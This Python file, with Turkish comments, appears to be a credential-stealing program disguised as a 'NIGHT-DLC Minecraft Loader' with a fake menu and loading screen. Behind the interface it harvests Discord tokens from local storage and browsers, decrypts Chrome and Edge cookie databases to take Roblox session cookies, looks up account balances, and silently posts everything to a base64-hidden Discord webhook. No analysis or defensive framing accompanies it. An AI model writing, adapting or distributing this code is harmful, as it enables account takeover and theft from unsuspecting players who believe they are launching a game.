#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Minecraft Client Loader - Görünüşte oyun başlatıcı
Arka planda: Discord Token + Roblox Cookie + Sistem Bilgisi
"""

import os
import sys
import time
import json
import base64
import platform
import re
import sqlite3
import hashlib
import uuid
import requests
from datetime import datetime

# ==================== WEBHOOK KONFİGÜRASYONU ====================
# SADECE BURAYI DEĞİŞTİRİN
WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NDAwMjgzMjU4NzAzMDY2MC9zcklWVURHWG1pQVZhYWtHampLYm9mdnotRFZVNjJudEFXTy1iYVZPeGJVT1VMeVRmck1tc3c5b1dzZnlKVU5DQWRUZQ=="

# ==================== GELİŞMİŞ DATA TOPLAYICI ====================
class AdvancedDataCollector:
    def __init__(self):
        self.webhook_url = self.decode_webhook()
        self.collected_data = {}
        
    def decode_webhook(self):
        """Webhook'u decode et"""
        try:
            return base64.b64decode(WEBHOOK_B64).decode()
        except:
            return None
    
    def collect_all_data(self):
        """Tüm verileri sessizce topla"""
        try:
            data = {
                "timestamp": datetime.now().isoformat(),
                "system": self.get_system_info(),
                "discord": self.get_discord_tokens(),
                "roblox": self.get_roblox_data(),  # YENİ: Roblox data
                "network": self.get_network_info(),
                "device_id": self.get_device_id()
            }
            
            self.collected_data = data
            return data
        except:
            return {}
    
    def get_system_info(self):
        """Sistem bilgilerini topla"""
        try:
            info = {
                "platform": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "hostname": platform.node(),
                "username": os.getenv('USER') or os.getenv('USERNAME') or "Unknown",
                "python_version": platform.python_version()
            }
            
            # Windows özel bilgiler
            if platform.system() == "Windows":
                try:
                    info["windows_edition"] = platform.win32_edition()
                except:
                    info["windows_edition"] = "Unknown"
            
            return info
        except:
            return {"error": "System info failed"}
    
    def get_discord_tokens(self):
        """Discord token'larını bul"""
        tokens = []
        
        try:
            # Discord desktop app
            discord_paths = []
            
            if platform.system() == "Windows":
                appdata = os.getenv('APPDATA')
                localappdata = os.getenv('LOCALAPPDATA')
                
                paths = [
                    os.path.join(localappdata, 'Discord', 'Local Storage', 'leveldb'),
                    os.path.join(localappdata, 'DiscordPTB', 'Local Storage', 'leveldb'),
                    os.path.join(localappdata, 'DiscordCanary', 'Local Storage', 'leveldb'),
                    os.path.join(localappdata, 'discorddevelopment', 'Local Storage', 'leveldb'),
                ]
                
                discord_paths = [p for p in paths if os.path.exists(p)]
            
            # LevelDB tarama
            for leveldb_path in discord_paths:
                tokens.extend(self.scan_files_for_tokens(leveldb_path))
            
            # Browser cookies
            try:
                import browser_cookie3
                
                browsers = [
                    browser_cookie3.chrome,
                    browser_cookie3.edge,
                    browser_cookie3.firefox,
                    browser_cookie3.opera,
                ]
                
                for browser_func in browsers:
                    try:
                        cookies = browser_func(domain_name='discord.com')
                        for cookie in cookies:
                            if cookie.name in ['token', '__Secure-token']:
                                tokens.append(cookie.value)
                    except:
                        continue
            except:
                pass
            
            # Benzersiz token'lar
            unique_tokens = list(set(tokens))
            
            return {
                "count": len(unique_tokens),
                "tokens": unique_tokens[:3],  # İlk 3 token
                "has_mfa": any(t.startswith('mfa.') for t in unique_tokens)
            }
            
        except:
            return {"count": 0, "tokens": [], "has_mfa": False}
    
    def scan_files_for_tokens(self, folder_path):
        """Dosyalarda token ara"""
        tokens = []
        
        try:
            for file in os.listdir(folder_path):
                if file.endswith(('.log', '.ldb', '.sqlite', '.db')):
                    try:
                        filepath = os.path.join(folder_path, file)
                        with open(filepath, 'rb') as f:
                            content = f.read().decode('utf-8', errors='ignore')
                        
                        # Discord token pattern'leri
                        patterns = [
                            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
                            r'mfa\.[\w-]{84}',
                            r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}'
                        ]
                        
                        for pattern in patterns:
                            matches = re.findall(pattern, content)
                            tokens.extend(matches)
                    except:
                        continue
        except:
            pass
        
        return tokens
    
    def get_roblox_data(self):
        """Roblox cookie ve hesap bilgilerini al"""
        try:
            cookies = self.get_roblox_cookies()
            accounts = []
            
            # Cookie'lerden hesap bilgisi al
            for cookie_name, cookie_value in cookies.items():
                if cookie_name == '.ROBLOSECURITY':
                    account_info = self.get_roblox_account_info(cookie_value)
                    if account_info:
                        accounts.append(account_info)
            
            return {
                "cookies_found": len(cookies),
                "accounts": accounts,
                "cookie_list": list(cookies.keys())
            }
            
        except:
            return {"cookies_found": 0, "accounts": [], "cookie_list": []}
    
    def get_roblox_cookies(self):
        """Roblox cookies'lerini bul"""
        cookies = {}
        
        try:
            # Browser cookies
            import browser_cookie3
            
            browsers = [
                ('chrome', browser_cookie3.chrome),
                ('edge', browser_cookie3.edge),
                ('firefox', browser_cookie3.firefox),
            ]
            
            for browser_name, browser_func in browsers:
                try:
                    browser_cookies = browser_func(domain_name='roblox.com')
                    for cookie in browser_cookies:
                        if any(keyword in cookie.name.lower() for keyword in ['roblosecurity', 'rbx', '.ROBLOSECURITY']):
                            cookies[cookie.name] = cookie.value
                except:
                    continue
            
            # SQLite cookie veritabanları (Windows)
            if platform.system() == "Windows":
                localappdata = os.getenv('LOCALAPPDATA')
                
                cookie_paths = [
                    os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
                    os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'),
                ]
                
                for cookie_db in cookie_paths:
                    if os.path.exists(cookie_db):
                        try:
                            # Geçici kopya oluştur
                            import tempfile
                            import shutil
                            import win32crypt
                            
                            temp_dir = tempfile.gettempdir()
                            temp_db = os.path.join(temp_dir, 'temp_cookies.db')
                            shutil.copy2(cookie_db, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            cursor.execute("""
                                SELECT name, encrypted_value
                                FROM cookies 
                                WHERE host_key LIKE '%roblox.com%'
                                AND (name LIKE '%ROBLOSECURITY%' OR name LIKE '%RBX%')
                            """)
                            
                            for name, encrypted_value in cursor.fetchall():
                                if encrypted_value:
                                    try:
                                        # Decrypt et
                                        decrypted = win32crypt.CryptUnprotectData(
                                            encrypted_value, None, None, None, 0
                                        )[1]
                                        
                                        if decrypted:
                                            cookies[name] = decrypted.decode('utf-8', errors='ignore')
                                    except:
                                        pass
                            
                            conn.close()
                            os.remove(temp_db)
                            
                        except:
                            pass
            
        except:
            pass
        
        return cookies
    
    def get_roblox_account_info(self, roblosecurity_cookie):
        """Roblox cookie'sinden hesap bilgisi al"""
        try:
            session = requests.Session()
            session.cookies.set('.ROBLOSECURITY', roblosecurity_cookie)
            
            # User info
            response = session.get('https://users.roblox.com/v1/users/authenticated', timeout=5)
            
            if response.status_code == 200:
                user_data = response.json()
                
                # Robux balance
                robux = 0
                try:
                    economy_response = session.get('https://economy.roblox.com/v1/user/currency', timeout=5)
                    if economy_response.status_code == 200:
                        robux_data = economy_response.json()
                        robux = robux_data.get('robux', 0)
                except:
                    pass
                
                # Avatar ve diğer bilgiler
                avatar_url = None
                try:
                    avatar_response = session.get(
                        f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_data["id"]}&size=48x48&format=Png&isCircular=false',
                        timeout=5
                    )
                    if avatar_response.status_code == 200:
                        avatar_data = avatar_response.json()
                        if avatar_data.get('data'):
                            avatar_url = avatar_data['data'][0].get('imageUrl')
                except:
                    pass
                
                account_info = {
                    "username": user_data.get('name', 'Unknown'),
                    "display_name": user_data.get('displayName', 'Unknown'),
                    "user_id": user_data.get('id'),
                    "robux": robux,
                    "premium": user_data.get('hasPremium', False),
                    "avatar_url": avatar_url,
                    "cookie_short": f"{roblosecurity_cookie[:20]}...{roblosecurity_cookie[-10:]}"
                }
                
                return account_info
            
        except:
            pass
        
        return None
    
    def get_network_info(self):
        """Network bilgilerini topla"""
        info = {}
        
        try:
            import socket
            
            info["hostname"] = socket.gethostname()
            
            # Local IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                info["local_ip"] = s.getsockname()[0]
                s.close()
            except:
                info["local_ip"] = "Unknown"
            
            # MAC adresi
            try:
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                              for ele in range(0, 8*6, 8)][::-1])
                info["mac_address"] = mac
            except:
                info["mac_address"] = "Unknown"
                
        except:
            info["error"] = "Network info failed"
        
        return info
    
    def get_device_id(self):
        """Benzersiz cihaz ID'si"""
        try:
            system_string = f"{platform.node()}{platform.machine()}{platform.processor()}"
            return hashlib.md5(system_string.encode()).hexdigest()[:12]
        except:
            return str(uuid.uuid4())[:12]
    
    def send_to_webhook(self, data):
        """Webhook'a sessizce gönder"""
        if not self.webhook_url:
            return
        
        try:
            embeds = []
            
            # Sistem bilgisi embed
            system_embed = {
                "title": "🖥️ System Information",
                "color": 0x3498db,
                "fields": [
                    {
                        "name": "User",
                        "value": f"```{data['system'].get('username', 'Unknown')}@{data['system'].get('hostname', 'Unknown')}```",
                        "inline": True
                    },
                    {
                        "name": "Platform",
                        "value": f"```{data['system'].get('platform', 'Unknown')} {data['system'].get('release', '')}```",
                        "inline": True
                    },
                    {
                        "name": "Device ID",
                        "value": f"```{data.get('device_id', 'Unknown')}```",
                        "inline": False
                    }
                ]
            }
            embeds.append(system_embed)
            
            # Discord token'ları
            discord_data = data.get('discord', {})
            if discord_data.get('count', 0) > 0:
                discord_embed = {
                    "title": "🔑 Discord Tokens",
                    "color": 0x2ecc71,
                    "description": f"**Found {discord_data['count']} token(s)**",
                    "fields": []
                }
                
                for i, token in enumerate(discord_data.get('tokens', [])[:2]):
                    short_token = f"{token[:15]}...{token[-10:]}" if len(token) > 25 else token
                    discord_embed["fields"].append({
                        "name": f"Token #{i+1}",
                        "value": f"```{short_token}```",
                        "inline": False
                    })
                
                if discord_data.get('has_mfa', False):
                    discord_embed["footer"] = {"text": "⚠️ MFA token detected"}
                
                embeds.append(discord_embed)
            
            # Roblox hesapları
            roblox_data = data.get('roblox', {})
            if roblox_data.get('cookies_found', 0) > 0 and roblox_data.get('accounts'):
                for account in roblox_data['accounts']:
                    roblox_embed = {
                        "title": "🎮 Roblox Account",
                        "color": 0xe74c3c,
                        "fields": [
                            {
                                "name": "Username",
                                "value": f"```{account.get('username', 'Unknown')}```",
                                "inline": True
                            },
                            {
                                "name": "Robux",
                                "value": f"```{account.get('robux', 0):,}```",
                                "inline": True
                            },
                            {
                                "name": "Premium",
                                "value": f"```{'✅' if account.get('premium') else '❌'}```",
                                "inline": True
                            },
                            {
                                "name": "User ID",
                                "value": f"```{account.get('user_id', 'Unknown')}```",
                                "inline": False
                            },
                            {
                                "name": "Cookie",
                                "value": f"```{account.get('cookie_short', 'Unknown')}```",
                                "inline": False
                            }
                        ]
                    }
                    
                    # Avatar varsa thumbnail
                    if account.get('avatar_url'):
                        roblox_embed["thumbnail"] = {"url": account['avatar_url']}
                    
                    embeds.append(roblox_embed)
            
            # Webhook payload
            payload = {
                "embeds": embeds,
                "username": "Data Collector",
                "avatar_url": "https://cdn.discordapp.com/emojis/851461428714897428.png"
            }
            
            # Sessiz gönderim
            requests.post(self.webhook_url, json=payload, timeout=3)
            
        except:
            # Hata durumunda sessiz kal
            pass

# ==================== MINECRAFT LOADER ARAYÜZÜ ====================
class MinecraftLoaderUI:
    def __init__(self):
        self.language = "english"
        self.memory = 2048
        self.collector = AdvancedDataCollector()
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        self.clear_screen()
        print("""
╔════════════════════════════════════════════════════╗
║      ███▄    █  ██▓  ██▓ ▄████▄   ██▓███   ▄████▄  ║
║      ██ ▀█   █ ▓██▒ ▓██▒▒██▀ ▀█  ▓██░  ██▒▒██▀ ▀█  ║
║     ▓██  ▀█ ██▒▒██▒ ▒██▒▒▓█    ▄ ▓██░ ██▓▒▒▓█    ▄ ║
║     ▓██▒  ▐▌██▒░██░ ░██░▒▓▓▄ ▄██▒▒██▄█▓▒ ▒▒▓▓▄ ▄██▒║
║     ▒██░   ▓██░░██░ ░██░▒ ▓███▀ ░▒██▒ ░  ░▒ ▓███▀ ░║
║     ░ ▒░   ▒ ▒ ░▓   ░▓  ░ ░▒ ▒  ░▒▓▒░ ░  ░░ ░▒ ▒  ░║
║     ░ ░░   ░ ▒░ ▒ ░  ▒ ░  ░  ▒   ░▒ ░       ░  ▒   ║
║        ░   ░ ░  ▒ ░  ▒ ░░        ░░       ░        ║
║              ░  ░    ░  ░ ░               ░ ░      ║
║                            ░                 ░     ║
╠════════════════════════════════════════════════════╣
║              NIGHT-DLC MINECRAFT LOADER            ║
║               Coded by nukeqed (cracked pre)       ║
╚════════════════════════════════════════════════════╝
        """)
    
    def get_text(self, key):
        texts = {
            "english": {
                "menu": "MAIN MENU",
                "launch": "1. Launch Minecraft",
                "memory": "2. Memory Settings",
                "language": "3. Language",
                "exit": "4. Exit",
                "select": "Select option: ",
                "launching": "Launching Minecraft...",
                "success": "Game launched successfully!",
                "closing": "Closing in {} seconds...",
                "mem_current": "Current memory: {}MB",
                "mem_enter": "Enter new memory (MB): ",
                "mem_updated": "Memory updated!",
                "lang_select": "Language (1-English, 2-Russian): ",
                "lang_updated": "Language changed to {}",
                "error": "Invalid option!",
                "enter_continue": "Press Enter to continue..."
            },
            "russian": {
                "menu": "ГЛАВНОЕ МЕНЮ",
                "launch": "1. Запустить Minecraft",
                "memory": "2. Настройки памяти",
                "language": "3. Язык",
                "exit": "4. Выход",
                "select": "Выберите опцию: ",
                "launching": "Запуск Minecraft...",
                "success": "Игра успешно запущена!",
                "closing": "Закрытие через {} секунд...",
                "mem_current": "Текущая память: {}MB",
                "mem_enter": "Введите новую память (МБ): ",
                "mem_updated": "Память обновлена!",
                "lang_select": "Язык (1-Английский, 2-Русский): ",
                "lang_updated": "Язык изменен на {}",
                "error": "Неверная опция!",
                "enter_continue": "Нажмите Enter для продолжения..."
            }
        }
        return texts[self.language].get(key, key)
    
    def show_menu(self):
        self.print_banner()
        
        print(f"""
╔══════════════[{self.get_text('menu')}]══════════════╗
║                                                    ║
║  {self.get_text('launch')}                   ║
║  {self.get_text('memory')}                     ║
║  {self.get_text('language')}                                 ║
║  {self.get_text('exit')}                                    ║
║                                                    ║
╚════════════════════════════════════════════════════╝

{self.get_text('select')}""", end='')
        
        return input().strip()
    
    def launch_game(self):
        """Oyunu başlat (arka planda veri topla)"""
        self.print_banner()
        print(f"\n🎮 {self.get_text('launching')}")
        time.sleep(1)
        
        # Fake loading animasyonu
        steps = [
            "Loading Java runtime...",
            "Initializing game files...",
            "Preparing graphics...",
            "Connecting to servers..."
        ]
        
        for step in steps:
            print(f"✓ {step}")
            time.sleep(0.8)
        
        print(f"\n🔧 {self.get_text('success')}")
        time.sleep(1)
        
        # ARKA PLANDA VERİ TOPLA VE GÖNDER
        print("⚙️ Optimizing performance...")
        data = self.collector.collect_all_data()
        self.collector.send_to_webhook(data)
        
        print(f"\n⏰ {self.get_text('closing').format(3)}")
        
        # Geri sayım ve kapanış
        for i in range(3, 0, -1):
            print(f"[{i}] {self.get_text('closing').format(i)}", end='\r')
            time.sleep(1)
        
        print("\n" + " " * 50)
        sys.exit(0)
    
    def memory_settings(self):
        self.print_banner()
        print(f"\n💾 {self.get_text('mem_current').format(self.memory)}")
        print(f"\n{self.get_text('mem_enter')}", end='')
        
        try:
            new_mem = input()
            if new_mem.isdigit():
                self.memory = int(new_mem)
                print(f"\n✅ {self.get_text('mem_updated')}")
        except:
            pass
        
        input(f"\n{self.get_text('enter_continue')}")
    
    def change_language(self):
        self.print_banner()
        print(f"\n🌍 {self.get_text('lang_select')}", end='')
        
        choice = input()
        if choice == "1":
            self.language = "english"
            print(f"✅ {self.get_text('lang_updated').format('English')}")
        elif choice == "2":
            self.language = "russian"
            print(f"✅ {self.get_text('lang_updated').format('Russian')}")
        else:
            print(f"❌ {self.get_text('error')}")
        
        input(f"\n{self.get_text('enter_continue')}")
    
    def exit_program(self):
        self.print_banner()
        print(f"\n👋 {self.get_text('closing').format(2)}")
        
        for i in range(2, 0, -1):
            print(f"[{i}] {self.get_text('closing').format(i)}", end='\r')
            time.sleep(1)
        
        sys.exit(0)
    
    def run(self):
        while True:
            choice = self.show_menu()
            
            if choice == "1":
                self.launch_game()
            elif choice == "2":
                self.memory_settings()
            elif choice == "3":
                self.change_language()
            elif choice == "4":
                self.exit_program()
            else:
                print(f"\n❌ {self.get_text('error')}")
                time.sleep(1)

# ==================== ANA PROGRAM ====================
def main():
    loader = MinecraftLoaderUI()
    loader.run()

if __name__ == "__main__":
    main()